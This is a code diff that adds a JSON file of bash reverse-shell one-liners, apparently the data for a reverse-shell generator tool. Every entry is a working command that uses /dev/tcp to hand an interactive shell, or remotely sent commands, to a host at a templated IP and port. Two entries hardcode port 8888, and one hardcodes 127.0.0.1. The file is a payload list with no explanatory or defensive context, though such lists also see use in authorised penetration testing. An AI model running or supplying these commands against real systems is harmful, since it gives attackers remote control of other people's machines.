@@ -1,0 +1,20 @@
+{
+	"Linux": [
+		{
+			"name": "bash -i",
+			"command": "{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1"
+		},
+		{
+			"name": "bash 196", 
+          "command": "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196"
+		},
+      {
+        "name": "bash read line",
+        "command": "exec 5<>/dev/tcp/{IP}/8888;cat <&5 | while read line; do $line 2>&5 >&5; done"
+      },
+      {
+        "name": "bash 5",
+        "command": "{SHELL} -i 5<> /dev/tcp/127.0.0.1/8888 0<&5 1>&5 2>&5"
+      }
+	]
+}
